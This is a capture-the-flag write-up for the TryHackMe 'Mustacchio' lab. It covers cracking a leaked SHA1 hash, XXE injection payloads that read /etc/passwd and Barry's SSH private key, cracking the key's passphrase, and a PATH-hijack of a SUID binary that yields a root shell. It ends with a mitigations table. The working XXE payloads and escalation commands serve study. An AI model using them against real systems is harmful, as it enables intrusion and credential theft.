```
 ███╗   ███╗██╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗██╗  ██╗██╗ ██████╗
 ████╗ ████║██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔═══██╗
 ██╔████╔██║██║   ██║███████╗   ██║   ███████║██║     ██║     ███████║██║██║   ██║
 ██║╚██╔╝██║██║   ██║╚════██║   ██║   ██╔══██║██║     ██║     ██╔══██║██║██║   ██║
 ██║ ╚═╝ ██║╚██████╔╝███████║   ██║   ██║  ██║╚██████╗╚██████╗██║  ██║██║╚██████╔╝
 ╚═╝     ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚═╝  ╚═╝╚═╝ ╚═════╝
               TryHackMe: Mustacchio
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-08 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~13 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: SSH (22), HTTP (80)
- [x] Feroxbuster: found `users.bak` SQLite database in `/custom/js/`
- [x] Extracted `admin:SHA1` hash from SQLite dump
- [x] Cracked hash with Hashcat (SHA1, mode 100) → `bulldog19`
- [x] SSH with `admin:bulldog19`: blocked (publickey only)
- [x] Second port scan: found port 8765 (admin panel, nginx)
- [x] Logged into admin panel with `admin:bulldog19`
- [x] Identified XML POST parameter: confirmed XXE injection
- [x] Leaked `/etc/passwd` via XXE to confirm LFI
- [x] Spotted HTML comment hint: `Barry, you can now SSH in using your key!`
- [x] Fetched `/auth/dontforget.bak`: extracted XML comment format
- [x] XXE payload targeting `/home/barry/.ssh/id_rsa`: extracted encrypted SSH key
- [x] Cracked SSH key passphrase with John the Ripper → `urieljames`
- [x] SSH login as `barry`: retrieved user flag
- [x] SUID enumeration: found `/home/joe/live_log`
- [x] `strings` analysis: binary calls `tail` without absolute path
- [x] PATH hijack: fake `tail` in `/tmp` → copied SUID bash
- [x] `/tmp/bash -p` → root shell
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning (two passes: standard + deeper)
- 🕷️ Feroxbuster: web directory enumeration
- 🗄️ SQLite3: reading the leaked database backup
- 🔓 Hashcat: SHA1 hash cracking (mode 100)
- 🦊 Burp Suite: intercepting and modifying the XML POST request
- 🔑 ssh2john + John the Ripper: SSH key passphrase cracking
- 🔐 SSH: authenticated user shell
- 🔬 strings: binary analysis of the SUID executable

---

## ⚡ TL;DR

A SQLite backup file exposed in a public JS directory yielded an admin SHA1 hash cracked to `bulldog19`. Admin SSH was blocked, but a second port scan uncovered an nginx admin panel on 8765. Logging in revealed an XML comment form vulnerable to XXE: used first to read `/etc/passwd`, then to pull Barry's encrypted SSH private key. John cracked the passphrase; Barry's home had the user flag. A SUID binary owned by Joe called `tail` with a relative path was hijacked via `$PATH` manipulation, spawning a root shell.

---

## 📖 Introduction

Today's target is **Mustacchio**: a barber shop themed box that hides its vulnerabilities with the same care the barber presumably puts into a clean shave. That is to say: not much. An exposed SQLite database in a JS directory, an admin panel on a non-standard port serving raw XML to a parser that trusts it completely, and a SUID binary that calls system utilities by name rather than by path. Each layer is independently preventable, and yet here we are. The box earns its medium-leaning difficulty from the chain length rather than the complexity of any individual step: there are more moving parts here than in most easy boxes.

### Prerequisites

Readers are assumed to know:

- What a SQLite database is and how to dump its contents
- What XXE (XML External Entity) injection is and how it achieves LFI
- How SHA1 hashes are cracked and why unsalted SHA1 is inadequate
- What a SUID binary is and how relative `PATH` lookups enable hijacking

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan: Pass 1

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.48.141.220 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 |
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) |

Standard two ports on the first pass. The homepage is a barber shop landing page: `Mustacchio | Home`. Nmap flags one `robots.txt` disallowed entry: `/`, which disallows everything and reveals nothing useful.

### Web Directory Enumeration

*(~4 mins into the box)*

*Feroxbuster with PHP, HTML, and TXT extensions:*

```bash
feroxbuster -u http://10.48.141.220 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html
```

Most results are images and font files: cosmetic noise. The one hit that matters:

```
200  http://10.48.141.220/custom/js/users.bak   # ^^^ database backup in a JS directory
```

A `.bak` file sitting in a publicly browsable JavaScript directory is exactly as bad as it sounds.

### SQLite Credential Extraction

*Identifying the file type:*

```bash
file Downloads/users.bak
```

```
SQLite 3.x database, last written using SQLite version 3034001
```

Not a text file: a full SQLite database. Opened with `sqlite3`:

*Dumping the full database schema and contents:*

```bash
sqlite3 Downloads/users.bak
sqlite> .dump
```

```sql
CREATE TABLE users(username text NOT NULL, password text NOT NULL);
INSERT INTO users VALUES('admin','1868e36a6d2b17d4c2745f1659433a54d4bc5f4b');
```

Username `admin`, password as an unsalted SHA1 hash.

### Hash Cracking: Hashcat

*Cracking the SHA1 hash (mode 100 = raw SHA1):*

```bash
hashcat -m 100 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b /usr/share/wordlists/rockyou.txt
```

```
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19

Status: Cracked
Time: ~1 sec
```

Admin password: `bulldog19`.

### Port Scan: Pass 2

*(~15 mins into the box)*

SSH as `admin` was blocked immediately: the server only accepts publickey authentication. Rather than stalling, a second, deeper Nmap scan was run to check for services missed on the first pass:

```bash
nmap -sV -p- -T4 10.48.141.220
```

```
8765/tcp open  ultraseek-http   # ^^^ missed on first scan
```

Port 8765: a non-standard HTTP port running nginx. Navigating to `http://10.48.141.220:8765/` reveals a second login panel. `admin:bulldog19` worked.

---

## 🚪 Foothold

*(~18 mins into the box)*

### XXE Injection: XML External Entity

**What is XXE?** When an application parses user-supplied XML and the XML parser has external entity processing enabled, an attacker can define a custom entity that references a file on the server's filesystem. When the XML is processed and the entity is resolved, the file's contents are substituted in: effectively giving the attacker a file read primitive (LFI) through the XML parser.

The admin panel at port 8765 presents a single comment submission form. The POST body is a `xml=` parameter: a direct XML input. A JavaScript comment in the page source also hints at `/auth/dontforget.bak`, and an HTML comment reads: `Barry, you can now SSH in using your key!`

Three useful signals: the parameter name, a backup file path, and a username.

*Fetching the backup to understand the expected XML structure:*

```bash
cat Downloads/dontforget.bak
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>...</com>
</comment>
```

The XML structure the parser expects is now known. The XXE payload slots an external entity definition into the DOCTYPE and references it inside one of the existing fields.

*XXE payload to read `/etc/passwd`: confirming LFI:*

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

Sent via Burp Suite as a URL-encoded POST to `/home.php`. The response rendered the full `/etc/passwd` contents inside the comment preview: confirming XXE-to-LFI. Two user accounts confirmed: `joe` (uid 1002) and `barry` (uid 1003).

*XXE payload escalated to read Barry's SSH private key:*

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

```
# Response (truncated)
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57...
-----END RSA PRIVATE KEY-----
```

Barry's encrypted SSH key extracted via the XML parser. Saved locally as `id_rsa`.

---

## 🐚 Shell / Access

*(~25 mins into the box)*

### SSH Key Passphrase Cracking

*Converting the key to a John-crackable hash:*

```bash
ssh2john id_rsa > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

```
id_rsa:urieljames

1 password hash cracked, 0 left
```

Passphrase: `urieljames`.

*SSH login as `barry`:*

```bash
ssh barry@10.48.141.220 -i id_rsa
# Enter passphrase: urieljames
```

```
barry@mustacchio:~$ cat user.txt
62d77a4d5f97d47c5aa38b3b2651b831
```

---

## 📈 Escalation

*(~27 mins into the box)*

### SUID Enumeration

`sudo -l` failed: `barry`'s sudo password isn't `urieljames` (the key passphrase is not the system password). On to SUID hunting.

*Finding all SUID binaries:*

```bash
find / -type f -perm -u=s 2>/dev/null
```

The standard system entries are expected and unremarkable. One entry is not:

```
/home/joe/live_log
```

A SUID binary in another user's home directory, with a name suggesting it reads logs in real time.

### Binary Analysis: `strings`

*Inspecting the binary for readable strings:*

```bash
strings /home/joe/live_log
```

```
Live Nginx Log Reader
tail -f /var/log/nginx/access.log    # ^^^ relative path: no /usr/bin/tail
```

**Why is this dangerous?** When a program calls another program by name rather than by its full absolute path, the OS resolves the name by searching through the directories listed in the `$PATH` environment variable, left to right, stopping at the first match. If an attacker can prepend a directory they control to `$PATH` and place a malicious executable with the same name there, the SUID binary will execute the malicious version: inheriting root privileges.

### PATH Hijack

The exploit: create a fake `tail` script in `/tmp` that copies `/bin/bash` with the SUID bit set, prepend `/tmp` to `$PATH`, and run `live_log`. The SUID binary runs as root, executes our fake `tail` as root, producing a SUID copy of bash in `/tmp`.

*Step by step:*

```bash
# Create fake tail that stamps SUID onto a bash copy
echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod +s /tmp/bash' > /tmp/tail
chmod +x /tmp/tail

# Prepend /tmp to PATH so our fake tail is found first
export PATH=/tmp:$PATH

# Trigger the SUID binary: it calls tail, finds ours first
/home/joe/live_log
```

```
Live Nginx Log Reader
```

*The fake `tail` ran as root. Now spawning the SUID bash with `-p` to preserve effective UID:*

```bash
/tmp/bash -p
```

```
bash-4.3# whoami
root
```

*Collecting the root flag:*

```bash
cat /root/root.txt
```

```
3223581420d906c4dd1a5f9b530393a5
```

---

## 💥 Exploitation

The full attack chain, end to end:

1. **`users.bak` SQLite database** exposed in `/custom/js/` → `admin:SHA1` hash
2. **Hashcat** cracked unsalted SHA1 → `bulldog19`
3. **Port 8765** (missed on first scan) → nginx admin panel, `admin:bulldog19` worked
4. **XXE injection** on XML POST parameter → LFI confirmed via `/etc/passwd`
5. **XXE escalated** to read `/home/barry/.ssh/id_rsa` → encrypted SSH key extracted
6. **John the Ripper** cracked SSH key passphrase → `urieljames`
7. **SSH as `barry`** → user flag
8. **SUID binary `/home/joe/live_log`** calls `tail` with relative path
9. **PATH hijack** → fake `tail` in `/tmp` → SUID bash spawned
10. **`/tmp/bash -p`** → root shell → root flag

---

## 🐇 Rabbit Holes

### SSH as `admin`

After cracking `bulldog19`, the most obvious next step was SSH as `admin`. The server rejected it immediately: `Permission denied (publickey)`. The admin account has no password authentication enabled: only publickey. The credentials were valid, just for the wrong service. Port 8765's admin panel was the actual target.

### John the Ripper Failing on the SHA1 Hash

`john` was tried first on the SHA1 hash and returned no results: the hash was already in John's potfile from a previous session (or from the `.show` command having been run earlier), causing it to skip silently. Switching to Hashcat with `-m 100` cracked it immediately. When John says "No password hashes left to crack," it often means the hash was already cracked in a prior run: always check `john --show hash.txt` before concluding the password is uncrackable.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `62d77a4d5f97d47c5aa38b3b2651b831` | `/home/barry/user.txt` |
| Root | `3223581420d906c4dd1a5f9b530393a5` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Database backup exposed in web-accessible directory | Critical | Never store backup files under the webroot; move to a restricted off-web location and enforce directory listing off |
| Unsalted SHA1 password hash | High | Use bcrypt, Argon2, or PBKDF2 for password storage; SHA1 is a digest algorithm, not a password hash: it's trivially fast to brute-force |
| XXE injection via unsanitised XML parser | Critical | Disable external entity processing in the XML parser (`libxml_disable_entity_loader(true)` in PHP, or equivalent); validate and sanitise all XML input |
| SSH private key readable via LFI | High | Restrict `.ssh/` permissions to `700` and `id_rsa` to `600`; the file should be unreadable even to `www-data` |
| SUID binary calling utilities by relative path | Critical | Always use absolute paths for system calls inside privileged binaries; compile with a hardened `$PATH`; audit all SUID binaries regularly |
| Admin panel on non-standard port with no rate limiting | Medium | Apply rate limiting and account lockout to all login endpoints regardless of port; do not rely on obscurity |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** XXE is not just an academic vulnerability: when a web application parses XML and reflects the output, a single malicious DOCTYPE declaration can turn the XML parser into a filesystem reader. The moment user-supplied XML reaches a parser with external entity processing enabled, any file readable by the web process is exposed. Disabling external entities should be the default, not an afterthought.

---

## 🔁 If I Did It Again

Run the full port range scan with a slower, more thorough Nmap pass from the start rather than RustScan's default: port 8765 being on nginx (not Apache) meant it was technically on a different process and RustScan's initial fast sweep missed it. A `-p-` Nmap pass upfront saves the second scan.

---

## 🔚 Changelog

*Last updated: 2026-06-08*

---

[↑ Back to top](#)
